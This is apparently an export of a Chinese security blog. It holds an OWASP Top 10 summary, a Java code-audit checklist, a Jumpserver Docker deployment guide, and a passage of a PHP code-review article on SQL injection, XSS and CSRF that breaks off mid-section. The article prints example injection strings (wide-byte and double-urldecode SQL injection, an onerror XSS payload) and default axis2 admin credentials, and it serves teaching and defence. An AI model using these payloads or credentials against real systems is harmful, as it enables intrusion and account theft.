如果你不会定期做漏洞扫描和订阅你使用组件的安全公告。 如果你不基于风险并及时修复或升级底层平台、框架和依赖库。 很可能发生这种情况：根据变更控制，每月或每季度进行升级， 这使得组织在这段时间内会受到已修复但未修补的漏洞的威胁。 如果软件工程师没有对更新的、升级的或打过补丁的组件进行兼 容性测试。 如果你没有对组件进行安全配置 防范： 移除不使用的依赖、不需要的功能、组件、文件和文档。 利用如 versions、DependencyCheck 、retire.js等工具来持续的 记录客户端和服务器端以及它们的依赖库的版本信息。持续监控 如CVE 和 NVD等是否发布已使用组件的漏洞信息，可以使用软 件分析工具来自动完成此功能。订阅关于使用组件安全漏洞的警 告邮件。 仅从官方渠道安全的获取组件，并使用签名机制来降低组件被篡 改或加入恶意漏洞的风险 监控那些不再维护或者不发布安全补丁的库和组件。如果不能打 补丁，可以考虑部署虚拟补丁来监控、检测或保护。 每个组织都应该制定相应的计划，对整个软件生命周期进行监控、 评审、升级或更改配置。 A10:不足的日志记录和监控不足的日志记录和监控，以及事件响应缺失或无效的集成，使攻击者能够进一步攻击系统、保持持 续性或转向更多系统，以及篡改、提取或销毁数据。大多数缺陷研究显示，缺陷被检测出的时间超 过200天，且通常通过外部检测方检测，而不是通过内部流程或监控检测。 脆弱性： 下列情况会导致不足的日志记录、检测、监控和响应： 未记录可审计性事件，如：登录、登录失败和高额交易。 告警和错误事件未能产生或产生不足的和不清晰的日志信息。 没有利用应用系统和API的日志信息来监控可疑活动。 日志信息仅在本地存储。 没有定义合理的告警阈值和制定响应处理流程。 渗透测试和使用DAST工具（如：OWASP ZAP）扫描没有触 发告警 对于实时或准实时的攻击，应用程序无法检测、处理和告警 防范： 根据应用程序存储或处理的数据的风险： 确保所有登录、访问控制失败、输入验证失败能够被记录到日 志中去，并保留足够的用户上下文信息，以识别可疑或恶意帐 户，并为后期取证预留足够时间。 确保日志以一种能被集中日志管理解决方案使用的形式生成 确保高额交易有完整性控制的审计信息，以防止篡改或删除， 例如审计信息保存在只能进行记录增加的数据库表中。 建立有效的监控和告警机制，使可疑活动在可接受的时间内被 发现和应对。 建立或采取一个应急响应机制和恢复计划，例如：NIST 80061 rev 2或更新版本。 参考文献：http://www.owasp.org.cn/owasp-project/OWASPTop102017v1.3.pdf https://blog.csdn.net/SKI_12/article/details/69952026?locationNum=13&amp;fps=1]]></content>
      <categories>
        <category>漏洞分析</category>
      </categories>
      <tags>
        <tag>漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Java代码审计（整理）]]></title>
    <url>%2F2018%2F08%2F13%2FJava%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%EF%BC%88%E6%95%B4%E7%90%86%EF%BC%89%2F</url>
    <content type="text"><![CDATA[0x01 测试工具1.1 反编译java类如果项目中未提供所有java源代码，只提供编译后的class文件，可以运行jd-gui，选择菜单File—Open File，对class文件进行反编译 选择class文件或者jar包，点击打开按钮，即可查看反汇编后的java源代码 1.2 Eclipse环境审计 使用Eclipse的Import功能将程序代码导入workspace，打开任一java源文件，选择Source Analyse菜单下的条目进行关键方法搜索，搜索结果在窗口下面显示，然后进行人工分析。 0x02 认证管理2.1 图形验证码 用户登录过程是否有图形验证码保护，防止自动化程序猜测密码 验证码复杂度是否符合要求（干扰、变形） 验证码在使用过一次后是否会自动刷新 验证码明文是否会被传送给客户端（页面或Cookie） 验证码是否在被保护的操作进行前来验证（无验证或无效验证） 2.2 认证实现 用户认证过程中，用户名和密码合法性的检查方式是否符合要求 较安全的做法为先校验验证码，再检查用户名，最后比对密码的密文 是否具备用户注销功能 用户注销时是否清理了当前用户会话 是否会将密码作为重定向的一部分进行传送 在统一认证SSO模式下，有的实现并非使用Token来交换认证信息，而是通过客户端直接传递账号、密码，这种情形下有可能在URL中直接传递明文密码。 认证过程中对于用户名错误和密码错误提示是否相同 统一用户名和密码错误提示，可以降低账号、密码被猜解的风险 检查用户认证页面是否对认证失败的次数进行了限制 0x03 授权管理3.1 授权实现 应用的用户是否具有角色的区分 明确用户的角色定义、授权访问的范围，分析哪种情况下可能会导致越权 应用是否具备统一的（或独立）的权限控制模块 大部分的大型应用都会采用统一的权限控制模块 应用的权限控制模块是否存在漏洞 页面/功能是否使用了权限控制（模块） 识别出需要和无需权限控制的页面/功能，逐一进行验证。验证过程中需要考虑到用户的角色划分。 页面的权限控制是否正确 部分应用的权限控制（模块）的使用上存在缺陷，攻击者可能通过一些隐蔽的途径绕过鉴权，访问非授权资源 3.2 授权管理 高权限用户分析 分析系统高权限用户（例如：管理员用户）的分配情况及密码复杂度等 默认用户分析 分析系统是否存在默认用户、密码，密码复杂度等。 0x04 输入/输出验证4.1 SQL注入防护 是否存在全局过滤器 过滤器配置、过滤函数等 过滤器是否可以过滤所有查询请求 请求是否都按要求经过过滤器处理 过滤器的过滤是否符合要求 初期检查可以依据PHPIDS的规则库，后期根据收集的情况予以补充 是否使用了预查询机制 预查询是指在将数据传入SQL语句前明确指定传输数据的类型，以执行必要的转换。在Java中预查询的调用方式为prepareStatement。 是否存在SQL语句拼接 某些特殊的查询（特别复杂的组合查询）难免用到SQL语句拼接，遇到这种情况，就需要检查拼接是否有可能导致注入。 4.2 跨站攻击防护 是否存在全局XSS过滤器(论坛的过滤库) 过滤器的过滤是否符合要求 是否存在需过滤和不需过滤两种输出，页面是否控制恰当（*） 某些情况下可能存在两种输出，文本输出和富文本（HTML）输出，要强制文本输出，只需要调用HTMLEncode()对内容进行编码后输出即可；但是富文本本身就需要使用html来进行格式的控制，简单的编码就无法使用，这时需要在此类内容从客户端输入（用户提交）或输出给客户端（显示）时进行危险代码过滤。 输出的时候是否进行编码（HTML、JS） 4.3 CSRF攻击防护 Web表单是否使用了Token（或验证码） Web表单提交（成功或不成功）后token（或验证码）是否重置 检查Token的生成算法是否安全 可以从测试环境来检查生成的验证码是否符合复杂性要求，如是否有干扰线/点、字符变形等。 检查服务器获取Web表单参数值的方式 如果在操作时不严格区分GET和POST，在没有Token（或验证码）的辅助下很容易导致CSRF的发生。 4.4 文件上传防护 是否限制了上传文件的扩展名 以白名单形式指定允许上传的扩展名；以黑名单形式指定禁止上传的文件名 是否对上传文件进行了重命名操作 重命名操作是否安全，防止重命名过程中产生二次风险 是否对上传文件的存放位置禁止了脚本执行 4.5 文件下载防护 是否存在客户端指定文件名的下载功能 直接指定文件名的下载是否允许客户端指定路径 对于不同用户的文件在下载时是否进行了权限控制 文件下载功能中是否对用户的权限进行了检查。 4.6 重定向与转发保护 是否具有客户端控制的重定向或转发 是否定义了重定向的信任域名或主机列表 是否对客户端的重定向或转发请求进行检查 0x05 会话管理5.1 Session管理 session信息是否放在url里面 通过应用服务器的配置检查 执行业务功能时，是否检查了当前用户session身份 从代码部分、从配置部分检查，需要根据应用实际使用的验证方式 成功登陆之后是否会更新SessionID 认证成功后是否强制刷新用户使用的SessionID session是否有超时注销功能 检查Session的超时时间设置是否符合要求，默认是20~30分钟 5.2 Cookie管理 是否会在Cookie中存储明文或简单编码/加密过的密码 是否会在Cookie中存储应用的特权标识 是否设置了Cookie的有效域和有效路径 是否设置了合适的Cookie有效时间 如果生存时间在20~30分钟左右，使用Session方式会更加安全 0x06 密码管理6.1 加密安全 密码是否以不可逆的哈希形态存储 是否使用不带salt的哈希算法来加密密码 加密哈希算法中的salt是否硬编码在代码中 6.2 密码安全 认证过程中传输的密码是否进行了加密处理 可以采用哈希算法或者RSA等加密算法将密码加密后传递，或者是使用SSL来做传输层加密。 修改密码功能是否进行了旧密码的验证或者是安全问题的确认 找回密码功能是否借用第三方途径 第三方途径主要有电子邮件、手机短信等。这些途径应该是找回密码前预留的。 找回密码功能是否采用验证码确认并重设机制 部分应用的找回密码功能是直接将原密码发送到密码保护邮箱，这种方式存在一定的安全风险。 检查密码设置页面是否对密码复杂度进行检查 至少包含数字和字母，长度最少6位，避免用户输入弱口令 0x08 调试&amp;接口7.1 异常处理 是否捕获了应用出现的错误并阻止其输出给客户端 详细的错误输出可能会导致SQL查询泄露、程序源代码泄露、物理路径泄露等。 异常处理是否能够全面覆盖所有异常行为 异常处理是否会导致程序流程异常，引发安全问题 备注：某些异常可能是致命的，但是如果程序捕获了异常，可能会导致程序绕过一些重要的步骤而直接执行后续的操作。 7.2 数据接口 接口服务是否存在安全漏洞 接口服务后台登录是否存在弱密码 例如：axis2，http://localhost:8080/axis2/axis2-admin/，默认用户名/密码：admin/axis2，密码在webapps\axis2\WEB-INF\conf\axis2.xml里配置 接口服务是否有默认的测试页面 例如：axis2，http://localhost:8080/axis2/axis2-web/HappyAxis.jsp，会暴露物理路径 接口服务应用是否包含身份认证，认证的帐号、密码（或密钥）的存储安全 例如：使用WSS4J对SOAP报文体进行身份认证 接口服务应用传输是否加密 例如：使用WSS4J对SOAP报文体进行加密 接口服务应用异常处理 例如：Webservice应用对特殊字符的处理，是否会在报错信息中泄露数据，参考http://www.soapui.org/About-SoapUI/features.html#security-testing 7.3 硬编码 代码中是否存在内置的敏感信息 如：调试帐号、外部接口帐号/密码、数据加/解密密钥等 0x08 日志审计8.1 日志记录 应用是否会将用户密码记入日志 日志记录的内容是否合理，避免日志文件增长过快，造成磁盘空间不足 0x09 运行环境9.1 应用配置 是否删除了不必要的网页、帐号及权限 页面包括应用服务器的默认页面、管理后台、测试页面、备份文件等；帐号指Web应用服务器的运行帐户 目录浏览是否被禁用 Web容器默认帐户的密码是否更改或禁用 不能删除的管理后台是否启用了密码保护 正式发布的应用是否包含开发调试文件、代码 如SVN版本信息文件、调试工具/页面、功能模块中的调试接口等 重要的配置信息是否进行了加密 如数据库连接配置、其它接口连接配置等 9.2 自定义错误 是否自定义了403、404、500错误页面 错误页面是否会输出详细错误信息 9.3 日志管理 服务器是否开启了用户访问日志的记录 记录的日志是否满足问题回溯的要求 是否记录了客户端地址、请求的方法、请求的URL、提交的参数（GET、POST、COOKIE参数）、请求的状态等 0x10 第三方组件分析应用使用的框架及引用的第三方组件，分析其是否存在各种已知漏洞，且当前环境漏洞是否可以重现 10.1 框架 Struts/Struts 2 Turbine Spring MVC Hibernate iBatis DotNetNuke 10.2 编辑器 CKEditor/FCKEditor eWebeditor NicEdit Free Rich Text Editor 10.3 上传组件 SmartUpload 0x11 安全功能对于比较重要的业务系统，例如：支付系统，可以参考以下条目，进行检测 11.1 登录认证 重要系统是否使用了双因素登录认证，例如：数字证书，支付盾，密保卡等，防止用户密码泄露导致系统被非法登录 重要系统是否使用了安全控件，对用户提交的关键数据进行加密 重要系统的后台管理界面是否限制了访问源地址 系统的密码重置等短信发送等功能的使用频率是否进行了限制，例如：一个手机号一分钟只能发送一条短信，防止被恶意利用多次发送短信 用户登录时的用户名，状态，源地址等关键信息需要记录到应用日志中，管理员可以进行查询 如果用户在不常用的地址登录，系统会提示用户，并显示上一次登录的源地址 对于多次密码错误的登录尝试，系统能否检测，禁止源地址访问10分钟，管理员登录后可以看到，也可以进行查询 11.2 数据操作 系统中大数据量查询等影响系统负载的功能是否进行了查询范围限制，例如：只能查询最近3个月的数据 系统中大数据量查询等影响系统负载的功能是否进行了查询频率限制，例如：一分钟内只能查询一次 高可用性要求的系统中是否有用户请求频率检测，超过访问阈值时，需要用户输入页面上的图形验证码，才能进一步操作 对报表查询等涉及大量数据的读取和导出操作，是否严格限制了查询范围，必要时可以使用双用户认证，限制单个用户大量读取业务数据的能力 业务关键数据的读取页面，是否使用静态密码、手机动态密码等二次验证，防止敏感数据泄露，例如：交易详单的查询 业务处理过程中用户身份等关键识别信息，是否保存在服务端，禁止从客户端提交 业务处理过程中关键操作需要用户确认和图形验证码，手机动态验证码等保护，防止重放攻击，例如：转账操作等 关键业务操作需要记录到应用日志中，可以设置阈值，超过系统会告警，管理员可以进行查询。例如：转账金额大于20万的交易记录 涉及资金的业务用户可以设置上限，例如：用户可以设置每日最高消费限额，并在转账 关键业务操作可以设置短信提醒，例如：用户进行资金转账，进行详单查询等 文章转载于：http://blog.nsfocus.net/code-audit-instruction/]]></content>
      <categories>
        <category>代码审计</category>
      </categories>
      <tags>
        <tag>代码审计</tag>
        <tag>Java</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Jumpserver的部署和基本使用]]></title>
    <url>%2F2018%2F08%2F13%2FJumpserver%E7%9A%84%E9%83%A8%E7%BD%B2%E5%92%8C%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8%2F</url>
    <content type="text"><![CDATA[【前言】 Jumpserver 是全球首款完全开源的堡垒机，使用 GNU GPL v2.0 开源协议，是符合 4A 的专业运维审计系统。Jumpserver 使用 Python / Django 进行开发，遵循 Web 2.0 规范，配备了业界领先的 Web Terminal 解决方案，交互界面美观、用户体验好。 0x01 【安装环境】CentOS Linux release 7.5.1804 (Core) 0x02 【准备】本次是使用docker安装jumpserver，所以要先在CentOS 7环境下安装Docker。 12345yum update -yyum -y install dockersystemctl start docker 验证安装1docker version 配置Docker设置镜像1234567vim /etc/docker/daemon.json\&gt;&#123; &quot;registry-mirrors&quot;: [&quot;https://aj2rgad5.mirror.aliyuncs.com&quot;]&#125; 重启Docker123systemctl daemon-reloadsystemctl restart docker.service 0x03 【安装步骤】Docker快速启动使用 root 命令行输入:1docker run -d -p 8080:80 -p 2222:2222 registry.jumpserver.org/public/jumpserver:1.0.0 访问 浏览器访问: http://&lt;容器所在服务器IP&gt;:8080 SSH访问: ssh -p 2222 &lt;容器所在服务器IP&gt; XShell等工具请添加connection连接 额外环境变量 DB_ENGINE = mysql DB_HOST = mysql_host DB_PORT = 3306 DB_USER = xxx DB_PASSWORD = xxxx DB_NAME = jumpserver REDIS_HOST = REDIS_PORT = REDIS_PASSWORD = &lt;1docker run -d -p 8080:80 -p 2222:2222 -e DB_ENGINE=mysql -e DB_HOST=192.168.1.1 -e DB_PORT=3306 -e DB_USER=root -e DB_PASSWORD=xxx -e DB_NAME=jumpserver registry.jumpserver.org/public/jumpserver:1.0.0 以上是实现在Docker下的安装，不过不建议在生产中使用, 因为所有软件都打包到一个Docker中了，不是Docker最佳实践。 在CentOS中安装请参考：http://docs.jumpserver.org/zh/docs/dockerinstall.html 0x04 【快速入门】架构说明 组件说明jumpserver 现指jumpserver管理后台，是核心组件（Core），使用Django Class BasedV 风格开发，支持Restful API COCO 实现SSH Server和Web Terver的组件，提供SSH和WebSocket接口，使用Paramiko和Flask开发。 Luna 现在是 Web Terminal 前端，计划前端页面都由该项目提供，Jumpserver 只提供 API，不再负责后台渲染html等。 Guacamole Apache 跳板机项目，Jumpserver 使用其组件实现 RDP 功能，Jumpserver 并没有修改其代码而是添加了额外的插件，支持 Jumpserver 调用。 基本设置 修改 URL 的 localhost 为你的实际 url 地址，否则邮件收到的地址将为 localhost 修改完 url 地址后需要重启 jumpserver 服务（重启才能生效，后续会解决这个问题） 创建管理用户 # 如果使用ssh私钥管理资产，需要先在资产上设置，这里举个例子供参考（本例登录资产使用root为例） (1). 在资产上生成 root 账户的公钥和私钥 $ ssh-keygen -t rsa # 默认会输入公钥和私钥文件到 ~/.ssh 目录 连续三次回车后。生成了本机的私钥和公钥 (2). 将公钥输出到文件 authorized_keys 文件，并修改权限 $ cat ~/.ssh/id_rsa.pub &gt;&gt; ~/.ssh/authorized_keys $ chmod 400 ~/.ssh/authorized_keys (3). 打开RSA验证相关设置 $ vim /etc/ssh/sshd_config RSAAuthentication yes PubkeyAuthentication yes AuthorizedKeysFile .ssh/authorized_keys (4). 重启 ssh 服务 $ service sshd restart (5). 上传 ~/.ssh 目录下的 id_rsa 私钥到 jumpserver 的管理用户中 sz id_rsa #下载私钥到本地，再上传到jumpserver中 # 这样就可以使用 ssh私钥 进行管理服务器 # 名称可以按资产树来命名。用户名root。密码和 SSH 私钥必填一个 创建资产 # 点击页面左侧的“资产管理”菜单下的“资产列表”按钮，查看当前所有的资产列表。 # 点击页面左上角的“创建资产”按钮，进入资产创建页面，填写资产信息。 # IP 地址和管理用户要确保正确，确保所选的管理用户的用户名和密码能”牢靠”地登录指定的 IP 主机上。 资产的系统平台也务必正确填写。公网 IP 信息只用于展示，可不填，Jumpserver 连接资产使用的是 IP 信息。 创建Windows系统用户 # 目前 Windows 暂不支持自动推送，用户必须在系统中存在且有权限使用远程连接，请确认资产的防火墙已经开放 注：Windows 资产协议务必选择 rdp # 如果想让用户登录资产时自己输入密码，可以点击系统用户的名称 点击清除认证信息 创建Widoows资产 # 同创建 Linux 资产一样。 # 创建 Windows 资产，系统平台请选择正确的 Windows，默认 RDP 端口号为3389，IP 和 管理用户请正确选择， 注：确保管理用户能正确登录到指定的 IP 主机上 Windwos资产连接说明：http://docs.jumpserver.org/zh/docs/faq_windows.html Web终端 Web 终端是资产使用界面，管理员和用户都是从这里登录到资产上，执行操作。点击资产名字连接资产，点击”Server”下的”Disconnect”断开资产连接。 历史会话 历史会话同在线会话包含的信息一样，都有用户、资产和 IP 地址等信息。Jumpserver 提供历史会话的录像观看。点击左侧的”回放”按钮，即可观看录像。 更多文档参考：http://docs.jumpserver.org/zh/docs/admin_guide.html 安装问题：http://docs.jumpserver.org/zh/docs/faq_install.html]]></content>
      <categories>
        <category>安全运维</category>
      </categories>
      <tags>
        <tag>服务部署</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Web 安全 代码审查之常规漏洞]]></title>
    <url>%2F2018%2F08%2F12%2FWeb-%E5%AE%89%E5%85%A8-PHP-%E4%BB%A3%E7%A0%81%E5%AE%A1%E6%9F%A5%E4%B9%8B%E5%B8%B8%E8%A7%84%E6%BC%8F%E6%B4%9E%2F</url>
    <content type="text"><![CDATA[0x01 前言 工欲善其事，必先利其器。我们做代码审计之前选好工具也是十分必要的。下面我给大家介绍两款代码审计中比较好用的工具。 什么是源代码审查？检查源代码中的缺点和错误信息，分析并找到这些问题引发的安全漏洞，并提供代码修订措施和建议;是一种以发现程序错误，安全漏洞和违反程序规范，为目标的源代码分析 MVC设计模型： Struts简介：Struts是Apache软件基金下一个项目。Struts有一组相互协作的类（组件）、Servlet以及jsp tag lib组成。基于struts构架的web应用程序基本上符合JSP Model2的设计标准，可以说是MVC设计模式的一种变化类型。 根据上面对framework的描述，很容易理解为什么说Struts是一个web framework，而不仅仅是一些标记库的组合。 但 Struts 也包含了丰富的标记库和独立于该框架工作的实用程序类。Struts有其自己的控制器（Controller），同时整合了其他的一些技术去实现模型层（Model）和视图层（View）。在模型层，Struts可以很容易的与数据访问技术相结合，包括EJB，JDBC和Object Relation Bridge。在视图层，Struts能够与JSP, Velocity Templates,XSL等等这些表示层组件相结合 ZF框架： Zend Framework(简写ZF)是由 Zend 公司支持开发的完全基于 PHP5 的开源PHP开发框架，可用于开发 Web 程序和服务，ZF采用 MVC(Model–View-Controller) 架构模式来分离应用程序中不同的部分方便程序的开发和维护。 代码审计的方式通读原文：函数集文件、配置文件、安全过滤文件、index文件程序结构：浏览源码文件夹，了解程序的大致目录入口文件：web.xml、struts-xx.xml、spring-xxx.xml文件一般是整个程序的入口，从中可知道：程序的架构、运行流程、包含哪些配置文件、包含哪些过滤文件和安全过滤文件、了解程序的业务逻辑配置文件：一般类似config.properties 等文件，保存一些数据库相关信息、程序的一些信息。先看数据库编码，如果是gbk可能存在宽字节注入。若变量的值用双引号、则可能存在双引号解析代码执行的问题过滤功能：通过详读公共函数文件和安全过滤文件等文件，清晰掌握：用户输入的数据，哪些被过滤，哪些无过滤如何过滤。在哪里被过滤了？如何过滤，过滤的方式是替换还是正则，有没有GPC，有没有使用 addslasher()处理？能否绕过过滤的数据。 0x02 代码审计工具1：Fortify SCAFortify SCA 是一个静态的、白盒的软件源代码安全测试工具。它通过内置的五大主要分析引擎：数据流、语义、结构、控制流、配置流等对应用软件的源代码进行静态的分析，分析的过程中与它特有的软件安全漏洞规则集进行全面地匹配、查找，从而将源代码中存在的安全漏洞扫描出来，并给予整理报告。扫描的结果中不但包括详细的安全漏洞的信息，还会有相关的安全知识的说明，以及修复意见的提供。 工作原理Foritfy SCA 首先通过调用语言的编译器或者解释器把前端的语言代码（如JAVA，C/C++源代码）转换成一种中间媒体文件NST（Normal Syntax Tree）将其源代码之间的调用关系，执行环境，上下文等分析清楚。然后再通过上述的五大分析引擎从五个切面来分析这个NST，匹配所有规则库中的漏洞特征，一旦发现漏洞就抓取出来。最后形成包含详细漏洞信息的FPR结果文件，用AWB打开查看。 扫描结果：Fortify SCA 的结果文件为.FPR文件，包括详细的漏洞信息：漏洞分类，漏洞产生的全路径，漏洞所在的源代码行，漏洞的详细说明及修复建议等目前Fortify SCA可以扫描出约350种漏洞，Fortify将所有安全漏洞整理分类，根据开发语言分项目，再细分为8个大类，约350个子类 0x03 代码审计工具2：Seay源代码审计工具功能介绍这些是seay 第一个版本的部分功能，现在最新版本是2.1、傻瓜化的自动审计、支持php代码调试、函数/变量定位、生成审计报告、自定义审计规则、mysql数据库管理、黑盒敏感信息泄露一键审计、支持正则匹配调试 、编辑保存文件、POST数据包提交 。安装方法安装环境需要 .NET2.0以上版本环境才能运行，下载安装包之后点击下一步就安装好了，非常的简便。安装包下载地址：http://enkj.jb51.net:81/201408/tools/Seayydmsjxt(jb51.net).rar 0x04 代码审计工具3：RIPS文献参考：https://mp.weixin.qq.com/s/W4ZgCEmjkSAexXBTVBD_zg功能介绍RIPS 是一款基于 PHP 开发的针对 PHP 代码安全审计的软件。另外，它也是一款开源软件，由国外安全研究员 Johannes Dahse 开发，程序只有 450KB，目前能下载到的最新版是0.55。在写这段文字之前笔者特意读过它的源码，它最大的亮点在于调用了 PHP 内置解析器接口token_get_all，并且使用Parser做了语法分析，实现了跨文件的变量及函数追踪，扫描结果中非常直观地展示了漏洞形成及变量传递过程，误报率非常低。RIPS 能够发现 SQL 注入、XSS 跨站、文件包含、代码执行、文件读取等多种漏洞，支持多种样式的代码高亮。比较有意思的是，它还支持自动生成漏洞利用。 安装方法下载地址：https://jaist.dl.sourceforge.net/project/rips-scanner/rips-0.55.zip.解压到任意一个PHP的运行目录在浏览器输入对应网址，可以通过下图看到有一个path 在里面填写你要分析的项目文件路径，点击 scan. 0x05 代码审计实战通过刚才安装的两个审计工具运行后我们可以发现，会分析出很多隐藏的漏洞，那下面我们看看其中的SQL注入、XSS、CSRF产生的原因,通过原因来分析如何去审计代码。 SQL Injection （SQL 注入攻击）SQL注入攻击（SQL Injection），简称注入攻击、SQL注入，被广泛用于非法获取网站控制权，是发生在应用程序的数据库层上的安全漏洞。在设计程序，忽略了对输入字符串中夹带的SQL指令的检查，被数据库误认为是正常的SQL指令而运行，从而使数据库受到攻击，可能导致数据被窃取、更改、删除，以及进一步导致网站被嵌入恶意代码、被植入后门程序等危害。 SQL注入产生的原因程序开发过程中不注意规范书写sql语句和对特殊字符进行过滤，导致客户端可以通过全局变量POST和GET提交一些sql语句正常执行 编码注入方式宽字节注入，这个是怎么回事呢？在实际环境中程序员一般不会写上面类似的代码，一般都会用addslashes()等过滤函数对从web传递过来的参数进行过滤。不过有句话叫做，道高一尺魔高一丈，我们看看白帽子是怎么突破的。用PHP连接MySQL的时候，当设置 character_set_client=gbk时候会导致一个编码漏洞。我们知道addslashes() 会把参数 1’ 转换成 1\’,而我们提交参数 1%df’ 时候会转成 1縗’，那我们输入 1%df’ or 1=1%23时候，会被转换成 1縗’ or 1=1#’。简单来说%df’会被过滤函数转义为%df\’ ，%df\’ = %df%5c%27 在使用gbk编码的时候会认为%df%5c是一个宽字节%df%5c%27=縗’，这样就会产生注入。那如何防御这个宽字节呢？我希望大家开发网站尽量使用UTF8编码格式，如果转换麻烦，最安全的方法就是使用PDO预处理。挖掘这种漏洞主要是检查是否使用了gbk，搜索guanjianc character_set_client=gbk 和mysql_set_chatset(‘gbk’) 。二次urldecode注入，这中方式也是因为使用了urldecode不当所引起的漏洞。我们刚才知道了 addslashes()函数可以防止注入，他会在(‘)、(“)、()前面加上反斜杠来转义。那我们假设我们开启了GPC，我们提交了一个参数，/test.php?uid=1%2527,因为参数中没有单引号，所以第一次解码会变成uid=1%27,%25解码出来就是%，这时候程序里如果再去使用urldecode来解码，就会把%27解码成单引号(‘)，最终的结果就是uid=1’.我们现在知道了原有是因为urldecode引起的，我们可以通过编辑器的搜索urldecode和rawurldecode找到二次url漏洞。 从漏洞类型区分可以分为三种类型可显：攻击者可以直接在当前界面内容中获取想要获得的内容。报错：数据库查询返回结果并没有在页面中显示，但是应用程序将数据库报错信息打印到了页面中。所以攻击者可以构造数据库报错语句，从报错信息中获取想要获得的内容，所以我建议在数据库类中设置不抛出错误信息。盲注：数据库查询结果无法从直观页面中获取攻击者通过使用数据库逻辑或使数据库库执行延时等方法获取想要获得的内容。 SQL 注入漏洞挖掘方法针对上面提到的利用漏洞方法，总结了以下的挖掘方法：参数接收位置，检查是否有没过滤直接使用 _POST、$_COOKIE 参数的。SQL语句检查，搜索关键词 select update insert 等SQL语句关键处，检查SQL语句的参数是否可以被控制。宽字节注入,如果网站使用的 GBK 编码情况下，搜索guanjianc character_set_client=gbk 和mysql_set_chatset(‘gbk’) 就行。二次 urldecode 注入，少部分情况，gpc 可以通过编辑器的搜索 urldecode 和 rawurldecode 找到二次url漏洞。 SQL 注入漏洞防范方法虽然SQL注入漏洞非常多，但是防范起来却挺简单的，下面介绍几个过滤函数和类:gpc/rutime 魔术引号过滤函数和类addslashesmysql_real_escape_stringintvalPDO 预处理 SQL注入过程 攻击者访问登录页面 输入用户名及密码 将含有攻击字符串组成SQL语句转发给数据库执行 数据库执行发回应用程序服务器 应用程序将内容返回浏览器，即绕过成功 XSS（Cross-Site Scripting）跨站脚本攻击（Cross Site Scripting）是指攻击者利用网站程序对用户输入过滤不足，输入可以显示在页面上对其他用户造成影响的HTML代码，从而盗取用户资料、利用用户身份进行某种动作或者对访问者进行病毒侵害的一种攻击方式。为了与层叠样式表Cascading Style Sheets）的缩写CSS区分开，跨站脚本攻击通常简写为XSS。XSS 属于被动式的攻击，因为其被动且不好利用，所以许多人常呼略其危害性。在 WEB2.0 时代，强调的是互动，使得用户输入信息的机会大增，在这个情况下，我们作为开发者，在开发的时候，要提高警惕。 xss 漏洞分类1.反射型，危害小，一般反射型XSS原理：就是通过给别人发送带有恶意脚本代码参数的URL，当URL地址被打开时，特定的代码参数会被HTML解析，执行，如此就可以获取用户的COOIKE，进而盗号登陆。比如hack甲构造好修改密码的URL并把密码修改成123，但是修改密码只有在登陆方乙才能修改，乙在登陆的情况下点击甲构造好的URL将直接在不知情的情况下修改密码。特点是：非持久化，必须用户点击带有特定参数的链接才能引起。反射型XSS是比较普遍的XSS，其危害程度通常被认为较小。但是某些反射型XSS造成的后果会很严重，如在输入框的name中输入，服务器不加处理，将name的值直接送到浏览器，则浏览器会每5秒自动刷新一次。严重者会导致服务器崩溃。 2.存储型，危害大，影响时间长存储型XSS原理，假设你打开了一篇正常的文章页面，下面有评论功能。这个时候你去评论了一下，在文本框中输入了一些JavaScript代码，提交之后,你刷新这个页面后发现刚刚提交的代码又被原封不动的返回来并且执行了。这个时候你会想,我要写一段 JavaScript 代码获取 cookie 信息，然后通过ajax发送到自己的服务器去。构造好代码后你把链接发给其他的朋友，或者网站的管理员，他们打开 JavaScript 代码就执行了，你服务器就接收到了sessionid，你就可以拿到他的用户权限了。 3.dom型，特殊的一种dom型 XSS 是因为 JavaScript 执行了dom 操作，所造成的 XSS 漏洞，具体如下图。可以看到虽然经过 html 转义了，但是这块代码在返回到 html 中，又被 JavaScript 作为 dom 元素操作。那当我输入如下代码的时候依然会存在 XSS 漏洞。1name=&lt;img src=1 onerror=alert(1)&gt; 漏洞思路：搜索内容、发表文章、留言、评论回复 xss 漏洞挖掘方法根据上面的一些特点，可以总结出几个分析出几个挖掘方法：数据接收位置，检查 _POST、$_COOKIE是否经过转义。常见的反射型XSS搜索这种类似位置发现次数较多。而存储型在文章，评论出现比较多。 XSS 漏洞防范方法1.转义html实体，有两种方式：在入口和出口,我建议是在入口处转义，防止出口位置取出来的时候忘记转义，如果已经在入口转义了，出口位置就不用再次转义。2.在富文本编辑器中，经常会用到一些元素的属性，比如上图的onerror，那我们还需对元素的属性建立黑白名单。3httpOnly 即使存在xss漏洞，可以把危害大大降低。4.对所有输入中的script、iframe等字样进行严格的检查5.验证数据的类型及其格式、长度、范围和内容6.客户端做数据的验证与过滤，关键的过滤步骤在服务端进行检查7.入参和出参校验(1)“&lt; &gt;” 可以引入一个标签或者结束一个标签。(2) “&amp;” 可以引入一个字符实体。(3)对于外加双引号的属性值，双引号(””)是特殊字符，因为它们标记了该属性值的结束。(4) 对于外加单引号的属性值，单引号(‘’)是特殊字符，因为它们标记了该属性值的结束8.URL重定向校验（1）空格符、制表符和换行符标记了 URL 的结束。（2） “&amp;” 引入一个字符实体（3）非 ASCII 字符（即 ISO-8859-1 编码表中所有高于 128 的字符）不允许出现在 URL 中，因此在此上下文中也被视为特殊字符。（4）在服务器端对在 HTTP 转义序列中编码的参数进行解码时，必须过滤掉输入中的 “%” 符号。 CSRF（跨站请求伪造）CSRF 漏洞介绍CSRF（Cross-site request forgery）跨站请求伪造，通常缩写为CSRF或者XSRF，是一种对网站的恶意利用。听起来像跨站脚本（XSS），但它与XSS非常不同，XSS利用站点内的信任用户。而 CSRF 则通过伪装来自受信任用户的请求来利用受信任的网站。与 XSS 攻击相比，CSRF 攻击往往不大流行（因此对其进行防范的资源也相当稀少）和难以防范，所以被认为比XSS更具危险性。csrf 主要用来做越权操作，而且 csrf 一直没有被关注起来，所以很多程序现在也没有相关的防范措施。 漏洞危害攻击者盗用了你的身份信息，以你的名义发送恶意请求。以你名义发送邮件，发消息，盗取你的账号，甚至于购买商品，虚拟货币转账等造成的问题包括：个人隐私泄露以及财产安全。 CSRF 